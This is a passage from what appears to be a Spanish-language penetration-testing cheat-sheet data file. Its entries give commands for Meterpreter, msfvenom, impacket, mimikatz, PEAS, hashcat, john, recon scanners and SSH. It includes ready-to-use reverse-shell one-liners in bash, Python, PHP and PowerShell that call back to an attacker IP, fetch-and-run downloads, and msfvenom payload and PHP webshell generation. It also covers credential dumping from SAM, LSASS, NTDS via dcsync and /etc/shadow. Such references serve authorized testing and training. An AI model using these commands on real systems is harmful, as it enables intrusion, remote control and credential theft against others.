    command: 'sysinfo        # Info del sistema\ngetuid          # Usuario actual\ngetsystem       # Intentar escalar a SYSTEM\nhashdump        # Dump de hashes SAM\nkeylog_start    # Iniciar keylogger\ndownload <file> # Descargar archivo\nupload <file>   # Subir archivo\nshell           # Shell del sistema',
    description: 'Comandos básicos de Meterpreter post-explotación. Correr en sesión Meterpreter activa.',
    tags: ['meterpreter', 'post-exploitation'],
    mitreId: 'T1003',
  },

  // ── MSFVENOM ──────────────────────────────────────────────────────────────
  {
    id: 'msfvenom-linux',
    tool: 'msfvenom', phase: 'exploitation', category: 'Payloads',
    title: 'Linux ELF reverse shell',
    command: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=<tu-ip> LPORT=4444 -f elf -o shell.elf && chmod +x shell.elf',
    description: 'Genera un binario ELF para Linux que conecta de vuelta a tu listener. Para Meterpreter: cambiar shell_reverse_tcp por meterpreter/reverse_tcp.',
    tags: ['linux', 'payload', 'reverse-shell', 'elf'],
    mitreId: 'T1566',
  },
  {
    id: 'msfvenom-windows',
    tool: 'msfvenom', phase: 'exploitation', category: 'Payloads',
    title: 'Windows EXE reverse shell',
    command: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<tu-ip> LPORT=4444 -f exe -e x64/xor_dynamic -i 5 -o shell.exe',
    description: 'EXE para Windows con Meterpreter. -e: encoder (ofuscación básica), -i: iteraciones. Para AV evasion real necesitás más técnicas.',
    tags: ['windows', 'payload', 'meterpreter', 'exe'],
    mitreId: 'T1566',
  },
  {
    id: 'msfvenom-web',
    tool: 'msfvenom', phase: 'exploitation', category: 'Payloads Web',
    title: 'PHP reverse shell (webshell)',
    command: 'msfvenom -p php/reverse_php LHOST=<tu-ip> LPORT=4444 -f raw > shell.php',
    description: 'Genera una webshell PHP. Subir al target via file upload vulnerability y ejecutar via browser.',
    tags: ['php', 'webshell', 'web'],
  },
  {
    id: 'msfvenom-list',
    tool: 'msfvenom', phase: 'exploitation', category: 'Payloads',
    title: 'Listar payloads disponibles',
    command: 'msfvenom --list payloads | grep -E "linux|windows" | grep reverse_tcp',
    description: 'Lista todos los payloads disponibles. Filtrar por OS y tipo de conexión.',
    tags: ['payloads', 'list'],
  },

  // ── IMPACKET ──────────────────────────────────────────────────────────────
  {
    id: 'impacket-secretsdump',
    tool: 'impacket', phase: 'post_exploitation', category: 'Credential Dumping',
    title: 'secretsdump — dump de credenciales',
    command: 'secretsdump.py DOMAIN/user:password@<target>',
    description: 'Dump remoto de credenciales: SAM, LSA secrets, NTDS (si Domain Controller). Requiere credenciales admin.',
    tags: ['credentials', 'dump', 'windows', 'ad'],
    mitreId: 'T1003',
    notes: 'Si hay error de SMB: agregar -no-pass o usar -hashes para PTH',
  },
  {
    id: 'impacket-psexec',
    tool: 'impacket', phase: 'post_exploitation', category: 'Lateral Movement',
    title: 'psexec — shell remota',
    command: 'psexec.py DOMAIN/user:password@<target>',
    description: 'Shell SYSTEM remota via SMB. Análogo al PsExec de Sysinternals. Requiere admin share disponible.',
    tags: ['shell', 'lateral-movement', 'smb', 'windows'],
    mitreId: 'T1021',
  },
  {
    id: 'impacket-pth',
    tool: 'impacket', phase: 'post_exploitation', category: 'Pass-the-Hash',
    title: 'Pass-the-Hash',
    command: 'psexec.py -hashes LM:NT DOMAIN/user@<target>',
    description: 'Autenticación usando el hash NTLM directamente sin necesitar la contraseña en texto claro.',
    tags: ['pth', 'ntlm', 'lateral-movement', 'windows', 'ad'],
    mitreId: 'T1550',
    notes: 'Formato de hash: LM:NT. Si no tenés LM usar aad3b435b51404eeaad3b435b51404ee como placeholder.',
  },
  {
    id: 'impacket-smbclient',
    tool: 'impacket', phase: 'post_exploitation', category: 'File Transfer',
    title: 'smbclient — navegar shares',
    command: 'smbclient.py DOMAIN/user:password@<target>',
    description: 'Cliente SMB interactivo para navegar y transferir archivos de shares Windows.',
    tags: ['smb', 'file-transfer', 'windows'],
  },
  {
    id: 'impacket-kerberoast',
    tool: 'impacket', phase: 'post_exploitation', category: 'Active Directory',
    title: 'GetUserSPNs — Kerberoasting',
    command: 'GetUserSPNs.py DOMAIN/user:password -dc-ip <dc-ip> -request -outputfile kerberoast.txt',
    description: 'Solicita tickets Kerberos (TGS) para cuentas de servicio con SPN configurado. Los tickets se crackean offline con hashcat.',
    tags: ['kerberoasting', 'ad', 'kerberos', 'credential-attack'],
    mitreId: 'T1558',
    notes: 'Crackear: hashcat -m 13100 kerberoast.txt rockyou.txt',
  },

  // ── MIMIKATZ ──────────────────────────────────────────────────────────────
  {
    id: 'mimikatz-logonpasswords',
    tool: 'mimikatz', phase: 'post_exploitation', category: 'Credential Dumping',
    title: 'logonpasswords — credenciales en memoria',
    command: 'privilege::debug\nsekurlsa::logonpasswords',
    description: 'Extrae credenciales (plaintext y hashes) de LSASS. Requiere SeDebugPrivilege (admin/SYSTEM).',
    tags: ['credentials', 'lsass', 'windows', 'dump'],
    mitreId: 'T1003',
    notes: 'En Windows 10+: WDigest deshabilitado por defecto → no da plaintext. Solo hashes NTLM.',
  },
  {
    id: 'mimikatz-pth',
    tool: 'mimikatz', phase: 'post_exploitation', category: 'Pass-the-Hash',
    title: 'Pass-the-Hash con sekurlsa',
    command: 'sekurlsa::pth /user:administrator /domain:DOMAIN /ntlm:<hash> /run:cmd.exe',
    description: 'Inyecta un hash NTLM en memoria y abre un proceso (cmd.exe) con esa identidad. Sin necesitar la contraseña.',
    tags: ['pth', 'ntlm', 'lateral-movement'],
    mitreId: 'T1550',
  },
  {
    id: 'mimikatz-lsadump',
    tool: 'mimikatz', phase: 'post_exploitation', category: 'Credential Dumping',
    title: 'lsadump::dcsync — replicar AD',
    command: 'lsadump::dcsync /domain:DOMAIN /user:krbtgt',
    description: 'Simula una replicación de DC para obtener hashes. Requiere privilegios de Domain Admin o replication rights. Obtener hash de krbtgt para Golden Ticket.',
    tags: ['dcsync', 'ad', 'golden-ticket', 'krbtgt'],
    mitreId: 'T1003',
  },

  // ── LINPEAS / WINPEAS ────────────────────────────────────────────────────
  {
    id: 'linpeas-run',
    tool: 'linpeas', phase: 'post_exploitation', category: 'Privilege Escalation',
    title: 'Ejecutar LinPEAS',
    command: '# Desde tu máquina (servir):\npython3 -m http.server 8080\n\n# En el target:\ncurl -L http://<tu-ip>:8080/linpeas.sh | sh\n# O descarga + ejecuta:\nwget http://<tu-ip>:8080/linpeas.sh && bash linpeas.sh 2>/dev/null | tee linpeas.txt',
    description: 'Descarga y ejecuta LinPEAS para enumerar vectores de escalación de privilegios en Linux.',
    tags: ['privesc', 'linux', 'enum', 'automation'],
    mitreId: 'T1068',
    notes: 'Descargar LinPEAS: https://github.com/carlospolop/PEASS-ng/releases',
  },
  {
    id: 'linpeas-suid',
    tool: 'linpeas', phase: 'post_exploitation', category: 'Privilege Escalation',
    title: 'Manual SUID/SGID search',
    command: 'find / -perm -4000 -type f 2>/dev/null\nfind / -perm -2000 -type f 2>/dev/null',
    description: 'Buscar manualmente binarios con SUID (4000) o SGID (2000). Comparar con GTFOBins para explotación.',
    tags: ['suid', 'sgid', 'privesc', 'linux'],
    notes: 'Ver https://gtfobins.github.io para cómo explotar cada binario',
    mitreId: 'T1548',
  },
  {
    id: 'winpeas-run',
    tool: 'winpeas', phase: 'post_exploitation', category: 'Privilege Escalation',
    title: 'Ejecutar WinPEAS',
    command: '# Descargar y ejecutar en PowerShell:\n(New-Object Net.WebClient).DownloadFile("http://<tu-ip>:8080/winPEASx64.exe", "C:\\Temp\\wp.exe")\nC:\\Temp\\wp.exe > C:\\Temp\\winpeas.txt',
    description: 'WinPEAS para Windows — misconfigurations, servicios vulnerables, credenciales almacenadas, AlwaysInstallElevated, etc.',
    tags: ['privesc', 'windows', 'enum', 'automation'],
    mitreId: 'T1068',
  },

  // ── HASHCAT ───────────────────────────────────────────────────────────────
  {
    id: 'hashcat-md5',
    tool: 'hashcat', phase: 'exploitation', category: 'Password Cracking',
    title: 'MD5 / SHA1 / SHA256',
    command: 'hashcat -m 0 hash.txt rockyou.txt           # MD5\nhashcat -m 100 hash.txt rockyou.txt         # SHA1\nhashcat -m 1400 hash.txt rockyou.txt        # SHA256',
    description: 'Crackear hashes comunes con wordlist. -m: tipo de hash. Hashcat detecta GPU automáticamente.',
    tags: ['hash', 'cracking', 'wordlist'],
    notes: 'Para ver todos los modos: hashcat --help | grep -i md5',
    mitreId: 'T1110',
  },
  {
    id: 'hashcat-ntlm',
    tool: 'hashcat', phase: 'post_exploitation', category: 'Password Cracking',
    title: 'NTLM / NetNTLMv2',
    command: 'hashcat -m 1000 ntlm_hashes.txt rockyou.txt  # NTLM\nhashcat -m 5600 netntlmv2.txt rockyou.txt   # NetNTLMv2',
    description: 'Crackear hashes Windows. NTLM (-m 1000) del SAM, NetNTLMv2 (-m 5600) capturado con Responder.',
    tags: ['ntlm', 'windows', 'ad', 'cracking'],
    mitreId: 'T1110',
  },
  {
    id: 'hashcat-rules',
    tool: 'hashcat', phase: 'exploitation', category: 'Password Cracking',
    title: 'Rule-based attack',
    command: 'hashcat -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule',
    description: 'Aplicar reglas de mutación a una wordlist (mayúsculas, números al final, l33tspeak). best64 es un buen punto de partida.',
    tags: ['hash', 'cracking', 'rules'],
  },
  {
    id: 'hashcat-kerberoast',
    tool: 'hashcat', phase: 'post_exploitation', category: 'Password Cracking',
    title: 'Kerberoast TGS',
    command: 'hashcat -m 13100 kerberoast_hashes.txt rockyou.txt',
    description: 'Crackear tickets TGS de Kerberoasting. Modo 13100 para Kerberos 5 TGS-REP etype 23.',
    tags: ['kerberoasting', 'ad', 'kerberos'],
    mitreId: 'T1558',
  },

  // ── JOHN THE RIPPER ───────────────────────────────────────────────────────
  {
    id: 'john-basic',
    tool: 'john', phase: 'exploitation', category: 'Password Cracking',
    title: 'Crackear con wordlist',
    command: 'john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\njohn --show hash.txt  # Ver resultados',
    description: 'Crackeo básico con wordlist. John detecta el formato del hash automáticamente.',
    tags: ['hash', 'cracking', 'wordlist'],
    mitreId: 'T1110',
  },
  {
    id: 'john-unshadow',
    tool: 'john', phase: 'post_exploitation', category: 'Password Cracking',
    title: 'Crackear /etc/shadow',
    command: 'unshadow /etc/passwd /etc/shadow > hashes.txt\njohn --wordlist=rockyou.txt hashes.txt',
    description: 'Combina passwd + shadow en un archivo que john puede procesar. Requiere haber leído ambos archivos del target.',
    tags: ['linux', 'shadow', 'privesc'],
    mitreId: 'T1003',
  },
  {
    id: 'john-zip',
    tool: 'john', phase: 'exploitation', category: 'Password Cracking',
    title: 'Crackear ZIP/RAR protegidos',
    command: 'zip2john archivo.zip > zip.hash && john --wordlist=rockyou.txt zip.hash\nrar2john archivo.rar > rar.hash && john --wordlist=rockyou.txt rar.hash',
    description: 'Extraer el hash de archivos protegidos y crackearlo. zip2john, rar2john, pdf2john, ssh2john, office2john...',
    tags: ['zip', 'rar', 'cracking'],
  },

  // ── SHELLS (REVERSE SHELL ONE-LINERS) ─────────────────────────────────────
  {
    id: 'shell-bash',
    tool: 'shells', phase: 'exploitation', category: 'Reverse Shells',
    title: 'Bash reverse shell',
    command: 'bash -i >& /dev/tcp/<tu-ip>/4444 0>&1',
    description: 'Reverse shell pura en bash. La más confiable en sistemas Linux. Requiere que el target tenga bash.',
    tags: ['bash', 'reverse-shell', 'linux'],
    mitreId: 'T1059',
    notes: 'Listener: nc -lvnp 4444',
  },
  {
    id: 'shell-python',
    tool: 'shells', phase: 'exploitation', category: 'Reverse Shells',
    title: 'Python reverse shell',
    command: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<tu-ip>\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
    description: 'Reverse shell en Python 3. Usar python en lugar de python3 si es una máquina más vieja.',
    tags: ['python', 'reverse-shell', 'linux'],
    mitreId: 'T1059',
  },
  {
    id: 'shell-php',
    tool: 'shells', phase: 'exploitation', category: 'Reverse Shells',
    title: 'PHP reverse shell (one-liner)',
    command: "php -r '$s=fsockopen(\"<tu-ip>\",4444);exec(\"/bin/bash -i <&3 >&3 2>&3\");'",
    description: 'One-liner PHP para reverse shell. Alternativa a pentestmonkey/php-reverse-shell para situaciones donde solo podés ejecutar código PHP corto.',
    tags: ['php', 'reverse-shell', 'web'],
    mitreId: 'T1059',
  },
  {
    id: 'shell-powershell',
    tool: 'shells', phase: 'exploitation', category: 'Reverse Shells',
    title: 'PowerShell reverse shell',
    command: 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'<tu-ip>\',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"',
    description: 'Reverse shell en PowerShell para Windows. Ejecutar desde cmd o PowerShell.',
    tags: ['powershell', 'reverse-shell', 'windows'],
    mitreId: 'T1059',
  },
  {
    id: 'shell-upgrade',
    tool: 'shells', phase: 'post_exploitation', category: 'Shell Upgrade',
    title: 'Upgrade shell a TTY completa',
    command: '# En el target (después de tener shell):\npython3 -c "import pty; pty.spawn(\'/bin/bash\')"\n\n# En tu máquina (Ctrl+Z primero):\nstty raw -echo; fg\n\n# De vuelta en el target:\nexport TERM=xterm\nstty rows 50 columns 200',
    description: 'Convierte una shell simple en una TTY completa con historial, autocompletar y comandos interactivos.',
    tags: ['shell-upgrade', 'pty', 'interactive'],
  },

  // ── AMASS ─────────────────────────────────────────────────────────────────
  {
    id: 'amass-enum',
    tool: 'amass', phase: 'recon', category: 'Subdomain Enumeration',
    title: 'Enumerar subdominios',
    command: 'amass enum -d target.com -o subdominios.txt',
    description: 'Enumera subdominios usando múltiples fuentes: DNS brute-force, APIs públicas (Shodan, VirusTotal, etc.), certificate transparency.',
    tags: ['dns', 'subdomain', 'osint', 'recon'],
    mitreId: 'T1590',
  },
  {
    id: 'amass-passive',
    tool: 'amass', phase: 'recon', category: 'Subdomain Enumeration',
    title: 'Modo pasivo (solo OSINT)',
    command: 'amass enum -passive -d target.com -o passive.txt',
    description: 'Solo fuentes OSINT, sin queries DNS activas. Más sigiloso, menos completo.',
    tags: ['dns', 'subdomain', 'osint', 'passive'],
  },

  // ── CURL ──────────────────────────────────────────────────────────────────
  {
    id: 'curl-headers',
    tool: 'curl', phase: 'recon', category: 'HTTP Testing',
    title: 'Ver headers de respuesta',
    command: 'curl -I https://target.com\ncurl -v https://target.com 2>&1 | head -50',
    description: 'Obtener headers HTTP: Server, X-Powered-By, Content-Security-Policy, X-Frame-Options. Útil para fingerprinting.',
    tags: ['headers', 'fingerprinting', 'recon'],
    mitreId: 'T1592',
  },
  {
    id: 'curl-post',
    tool: 'curl', phase: 'exploitation', category: 'HTTP Testing',
    title: 'POST request con data',
    command: "curl -X POST https://target.com/login -d 'user=admin&pass=test' -c cookies.txt -v",
    description: 'Enviar POST con datos de formulario. -c: guardar cookies, -b: usar cookies, -v: verbose.',
    tags: ['post', 'web', 'testing'],
  },
  {
    id: 'curl-upload',
    tool: 'curl', phase: 'exploitation', category: 'File Upload',
    title: 'File upload vía curl',
    command: 'curl -X POST https://target.com/upload -F "file=@shell.php" -F "submit=Upload" -b "session=token"',
    description: 'Subir archivo con multipart/form-data. -F: form field, @archivo: contenido del archivo.',
    tags: ['upload', 'web', 'testing'],
  },

  // ── NUCLEI ────────────────────────────────────────────────────────────────
  {
    id: 'nuclei-basic',
    tool: 'nuclei', phase: 'scanning', category: 'Vulnerability Scanning',
    title: 'Scan con templates',
    command: 'nuclei -u https://target.com -t cves/ -o nuclei-results.txt',
    description: 'Escanea usando templates de CVEs. Nuclei tiene miles de templates para web, infraestructura, CVEs específicos.',
    tags: ['vuln-scan', 'cve', 'web', 'templates'],
    mitreId: 'T1190',
  },
  {
    id: 'nuclei-severity',
    tool: 'nuclei', phase: 'scanning', category: 'Vulnerability Scanning',
    title: 'Filtrar por severidad',
    command: 'nuclei -u https://target.com -severity critical,high -t technologies/',
    description: 'Correr solo templates de severidad crítica y alta para resultados rápidos.',
    tags: ['vuln-scan', 'severity', 'templates'],
  },

  // ── SSH TUNNELING ─────────────────────────────────────────────────────────
  {
    id: 'ssh-local-forward',
    tool: 'ssh', phase: 'post_exploitation', category: 'Tunneling',
    title: 'Local port forwarding',
    command: 'ssh -L 8080:internal-target:80 user@<jump-host>',
    description: 'Redirige tráfico local 8080 → internal-target:80 a través del jump host. Útil para acceder a servicios internos.',
    tags: ['tunneling', 'port-forward', 'lateral-movement'],
    mitreId: 'T1021',
  },
  {
    id: 'ssh-dynamic',
    tool: 'ssh', phase: 'post_exploitation', category: 'Tunneling',
    title: 'SOCKS proxy dinámico',
    command: 'ssh -D 1080 user@<jump-host>\n# Luego configurar ProxyChains o browser con SOCKS5 127.0.0.1:1080',
    description: 'Crea un proxy SOCKS5 en tu puerto 1080 que enruta tráfico a través del servidor SSH. Usar con proxychains.',
    tags: ['socks', 'proxy', 'tunneling', 'lateral-movement'],
    notes: 'proxychains.conf: socks5 127.0.0.1 1080',
  },
  {
    id: 'ssh-remote-forward',
    tool: 'ssh', phase: 'post_exploitation', category: 'Tunneling',
    title: 'Remote port forwarding',
    command: 'ssh -R 4444:localhost:4444 user@<tu-vps>',
    description: 'El target abre túnel hacia tu VPS. Útil cuando el target no puede conectar directamente a tu IP pero sí a internet.',
    tags: ['tunneling', 'remote-forward'],
  },

  // ── TCPDUMP ───────────────────────────────────────────────────────────────
  {
    id: 'tcpdump-basic',
    tool: 'tcpdump', phase: 'recon', category: 'Traffic Capture',
    title: 'Captura básica de tráfico',
    command: 'tcpdump -i eth0 -w capture.pcap\ntcpdump -i eth0 -n host 192.168.1.100',
    description: 'Capturar tráfico de red. -i: interfaz, -w: guardar a pcap, -n: no resolver DNS.',
    tags: ['traffic', 'capture', 'pcap'],
  },
  {
    id: 'tcpdump-http',
    tool: 'tcpdump', phase: 'recon', category: 'Traffic Capture',
    title: 'Capturar tráfico HTTP/credenciales',
    command: "tcpdump -i eth0 -A -s 0 'tcp port 80 or port 443' | grep -iE '(pass|user|login|token|auth)'",
    description: 'Filtrar tráfico buscando credenciales en texto claro. -A: mostrar en ASCII, -s 0: capturar paquete completo.',
    tags: ['http', 'credentials', 'traffic'],
  },

  // ── WORDLISTS ─────────────────────────────────────────────────────────────
  {
    id: 'wordlists-comunes',
    tool: 'wordlists', phase: 'general', category: 'Recursos',
    title: 'Wordlists más usadas',
    command: '# RockYou (contraseñas):\n/usr/share/wordlists/rockyou.txt\n\n# SecLists (todo):\n/usr/share/seclists/\n\n# Dirbuster (directorios):\n/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n\n# Instalar SecLists:\napt install seclists\n# o: git clone https://github.com/danielmiessler/SecLists /usr/share/seclists',
    description: 'Las wordlists más importantes y dónde encontrarlas. SecLists es esencial para cualquier engagement.',
    tags: ['wordlists', 'resources', 'setup'],
  },
  {
    id: 'wordlists-custom',
    tool: 'wordlists', phase: 'general', category: 'Recursos',
    title: 'Crear wordlist personalizada con cewl',
    command: 'cewl https://target.com -d 3 -m 5 -w custom_words.txt\ncewl https://target.com -d 2 --with-numbers -w custom_words.txt',
    description: 'CeWL scrapea el sitio web del target y genera una wordlist basada en el contenido. Muy efectivo para contraseñas corporativas.',
    tags: ['wordlist', 'cewl', 'custom', 'osint'],
  },

  // ── WGET ─────────────────────────────────────────────────────────────────
  {
    id: 'wget-download',
    tool: 'wget', phase: 'general', category: 'File Transfer',
    title: 'Descargar archivo en el target',
    command: 'wget http://<tu-ip>:8080/herramienta.sh -O /tmp/h.sh && chmod +x /tmp/h.sh',
    description: 'Descargar un archivo desde tu servidor HTTP al target. Alternativa cuando no hay curl.',
    tags: ['file-transfer', 'download'],
  },
  {
    id: 'wget-mirror',
    tool: 'wget', phase: 'recon', category: 'Recon',
    title: 'Mirror de sitio web',
    command: 'wget --mirror --convert-links --adjust-extension --page-requisites --no-parent https://target.com',
    description: 'Descarga el sitio completo para análisis offline. Útil para buscar comentarios en código fuente, rutas ocultas, etc.',
    tags: ['recon', 'web', 'osint'],
  },

  // ── SSH — comandos prácticos (no hacking) ─────────────────────────────────
  {
    id: 'ssh-connect-port',
    tool: 'ssh', phase: 'general', category: 'Conexión',
    title: 'Conectar a puerto específico',
    command: 'ssh -p 2222 user@host\nssh -p 2222 user@192.168.1.100',
    description: 'Conectar a un servidor SSH en un puerto no estándar con -p. Muy común en entornos que mueven SSH del 22 por seguridad.',
    tags: ['ssh', 'connection'],
  },
  {
    id: 'ssh-copy-file-to',
    tool: 'ssh', phase: 'general', category: 'Transferencia de archivos',
    title: 'SCP — subir archivo al servidor',
    command: 'scp archivo.txt user@host:/ruta/destino/\nscp -P 2222 archivo.txt user@host:/home/user/\nscp -r ./carpeta/ user@host:/home/user/',
    description: 'Copiar archivos al servidor remoto con SCP. -P para puerto personalizado, -r para directorios completos.',
    tags: ['scp', 'file-transfer', 'upload'],
  },
  {
    id: 'ssh-copy-file-from',
    tool: 'ssh', phase: 'general', category: 'Transferencia de archivos',
    title: 'SCP — descargar archivo del servidor',
    command: 'scp user@host:/ruta/archivo.txt ./local/\nscp -r user@host:/var/log/ ./logs_backup/',
    description: 'Descargar archivos o directorios desde un servidor remoto. Indispensable para traer logs, configs y backups.',
    tags: ['scp', 'file-transfer', 'download'],
  },
  {
    id: 'ssh-keygen',
    tool: 'ssh', phase: 'general', category: 'Gestión de claves',
    title: 'Generar par de claves SSH',
    command: 'ssh-keygen -t ed25519 -C "tu@email.com"\nssh-keygen -t rsa -b 4096 -C "tu@email.com" -f ~/.ssh/id_rsa_servidor',
    description: 'Genera un par de claves pública/privada. Ed25519 es más moderno y seguro. -f para especificar nombre de archivo.',
    tags: ['keygen', 'auth', 'security'],
    notes: 'La clave pública (.pub) es la que se copia al servidor. La privada NUNCA se comparte.',
  },
  {
    id: 'ssh-copy-id',
    tool: 'ssh', phase: 'general', category: 'Gestión de claves',
    title: 'Desplegar clave pública en servidor',
    command: 'ssh-copy-id user@host\nssh-copy-id -i ~/.ssh/id_ed25519.pub -p 2222 user@host',
    description: 'Copia tu clave pública al archivo authorized_keys del servidor. Después podés conectar sin contraseña.',
    tags: ['keygen', 'auth', 'passwordless'],
    notes: 'Equivalente manual: cat ~/.ssh/id_ed25519.pub | ssh user@host "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"',
  },
  {
    id: 'ssh-jump',
    tool: 'ssh', phase: 'general', category: 'Conexión',
    title: 'Jump host / bastion',
    command: 'ssh -J usuario@bastion usuario@servidor-interno\nssh -J user@jump:2222 user@192.168.10.5',
    description: 'Conectar a un servidor interno pasando por un bastion host con una sola línea. -J es ProxyJump, reemplaza el viejo ProxyCommand.',
    tags: ['jump-host', 'bastion', 'tunneling'],
    notes: 'También configurar en ~/.ssh/config con Host + ProxyJump para no tipear siempre.',
  },
  {
    id: 'ssh-background-tunnel',
    tool: 'ssh', phase: 'post_exploitation', category: 'Tunneling',
    title: 'Túnel en segundo plano',
    command: 'ssh -fN -L 8080:internal:80 user@jump-host\nssh -fN -D 1080 user@host',
    description: '-f: ir a background, -N: no ejecutar comandos. Ideal para dejar túneles corriendo sin terminal ocupada.',
    tags: ['tunneling', 'background'],
  },
  {
    id: 'ssh-config',
    tool: 'ssh', phase: 'general', category: 'Configuración',
    title: 'SSH config — alias de hosts',
    command: '# ~/.ssh/config\nHost mi-server\n  HostName 192.168.1.100\n  User admin\n  Port 2222\n  IdentityFile ~/.ssh/id_ed25519\n\n# Luego simplemente:\nssh mi-server',
    description: 'El archivo ~/.ssh/config permite crear aliases con todas las opciones. Ahorra tipeo en hosts que usás frecuentemente.',
    tags: ['config', 'alias', 'productivity'],
  },

  // ── SUBFINDER ─────────────────────────────────────────────────────────────
  {
    id: 'subfinder-enum',
    tool: 'subfinder', phase: 'recon', category: 'Subdomain Enumeration',
    title: 'Enumerar subdominios',
    command: 'subfinder -d target.com -o subs.txt\nsubfinder -d target.com -silent | httpx -silent -status-code',
    description: 'Descubre subdominios usando APIs pasivas (SecurityTrails, Censys, Shodan, etc.). La pipe con httpx verifica cuáles están activos.',
    tags: ['subdomain', 'osint', 'recon'],
    mitreId: 'T1590',
    notes: 'Para más fuentes: agregar API keys en ~/.config/subfinder/provider-config.yaml',
  },
  {
    id: 'subfinder-multi',
    tool: 'subfinder', phase: 'recon', category: 'Subdomain Enumeration',
    title: 'Múltiples dominios + resolución',
    command: 'subfinder -dL dominios.txt -o subs_all.txt\nsubfinder -d target.com | dnsx -a -resp -o resolved.txt',
    description: '-dL acepta un archivo con múltiples dominios. Combinar con dnsx para resolver IPs y filtrar subdominios activos.',
    tags: ['subdomain', 'dns', 'bulk'],
  },

  // ── THEHARVESTER ──────────────────────────────────────────────────────────
  {
    id: 'harvester-basic',
    tool: 'theHarvester', phase: 'recon', category: 'OSINT',
    title: 'OSINT básico de dominio',
    command: 'theHarvester -d target.com -b all -l 500\ntheHarvester -d target.com -b google,linkedin,bing,dnsdumpster -f report',
    description: 'Recopila emails, subdominios, IPs y hosts desde múltiples fuentes. -b all usa todas las fuentes disponibles.',
    tags: ['osint', 'email', 'recon'],
    mitreId: 'T1589',
  },

  // ── MASSCAN ───────────────────────────────────────────────────────────────
  {
    id: 'masscan-fast',
    tool: 'masscan', phase: 'scanning', category: 'Port Scanning',
    title: 'Escaneo ultra-rápido de red',
    command: 'masscan -p1-65535 <target> --rate=10000 -oG masscan.txt\nmasscan -p80,443,8080,8443,22,21,3389 192.168.1.0/24 --rate=5000',
    description: 'Escaneo de puertos a alta velocidad. Mucho más rápido que nmap para descubrimiento inicial. Luego pasar a nmap para detalles.',
    tags: ['port-scan', 'fast', 'discovery'],
    mitreId: 'T1595',
    notes: 'Requiere root. Bajar el rate en redes inestables para evitar falsos negativos.',
  },
  {
    id: 'masscan-to-nmap',
    tool: 'masscan', phase: 'scanning', category: 'Port Scanning',
    title: 'Combinar con Nmap',
    command: "masscan -p1-65535 <target> --rate=5000 -oL ports.txt\nports=$(grep open ports.txt | awk '{print $3}' | tr '\\n' ',')\nnmap -sV -sC -p $ports <target>",
    description: 'Workflow típico: masscan descubre puertos abiertos rápido, nmap hace el fingerprinting detallado solo en esos puertos.',
    tags: ['port-scan', 'workflow', 'fingerprinting'],
  },

  // ── RUSTSCAN ──────────────────────────────────────────────────────────────
  {
    id: 'rustscan-basic',
    tool: 'rustscan', phase: 'scanning', category: 'Port Scanning',
    title: 'Scan rápido + pass a nmap',
    command: 'rustscan -a <target> -- -sV -sC\nrustscan -a <target> -r 1-65535 --ulimit 5000 -- -A',
    description: 'RustScan encuentra puertos abiertos en segundos y pasa automáticamente a nmap para el análisis. -- pasa flags a nmap.',
    tags: ['port-scan', 'fast', 'nmap'],
    mitreId: 'T1595',
    notes: 'Instalar: docker run -it rustscan/rustscan <target> o cargo install rustscan',
  },

  // ── NIKTO ─────────────────────────────────────────────────────────────────
  {
    id: 'nikto-basic',
    tool: 'nikto', phase: 'scanning', category: 'Web Scanning',
    title: 'Scan web básico',
    command: 'nikto -h https://target.com -o nikto.txt\nnikto -h https://target.com -ssl -Tuning 1234b -Format htm -output nikto.html',
    description: 'Detecta archivos peligrosos, versiones vulnerables, headers de seguridad faltantes y misconfigurations comunes.',
    tags: ['web', 'vuln-scan', 'headers'],
    mitreId: 'T1190',
    notes: 'Ruidoso — nikto genera muchas requests. No usar en ambientes de producción sin autorización.',
  },

  // ── WHATWEB ───────────────────────────────────────────────────────────────
  {
    id: 'whatweb-fingerprint',
    tool: 'whatweb', phase: 'recon', category: 'Fingerprinting',
    title: 'Fingerprinting de tecnologías',
    command: 'whatweb -a 3 https://target.com\nwhatweb -a 3 --log-json=whatweb.json https://target.com',
    description: 'Identifica CMS, frameworks, servidores, plugins, versiones. -a 3 es el nivel de agresividad medio (recomendado).',
    tags: ['fingerprinting', 'cms', 'web', 'recon'],
    mitreId: 'T1592',
  },
  {
    id: 'whatweb-bulk',
    tool: 'whatweb', phase: 'recon', category: 'Fingerprinting',
    title: 'Scan masivo de hosts',
    command: 'whatweb -a 1 -i hosts.txt --log-json=results.json\ncat subs.txt | xargs -I{} whatweb -a 1 {}',
    description: 'Fingerprinting masivo de una lista de hosts. -a 1 es sigiloso (solo una request por host).',
    tags: ['fingerprinting', 'bulk', 'recon'],
  },

  // ── FEROXBUSTER ───────────────────────────────────────────────────────────
  {
    id: 'feroxbuster-basic',
    tool: 'feroxbuster', phase: 'recon', category: 'Directory Fuzzing',
    title: 'Fuzzing recursivo',
    command: 'feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/common.txt\nferoxbuster -u https://target.com -x php,html,js --depth 3 -o ferox.txt',
    description: 'Feroxbuster es recursivo por defecto — al encontrar un directorio, lo fuzzea automáticamente. Más completo que gobuster para web.',
    tags: ['web', 'directory', 'fuzzing', 'recursive'],
    mitreId: 'T1190',
    notes: 'Instalar en Kali: apt install feroxbuster o cargo install feroxbuster',
  },

  // ── SEMGREP ───────────────────────────────────────────────────────────────
  {
    id: 'semgrep-scan',
    tool: 'semgrep', phase: 'recon', category: 'SAST',
    title: 'Análisis estático de código',
    command: 'semgrep --config=auto ./src/\nsemgrep --config=p/owasp-top-ten .\nsemgrep --config=p/javascript .',
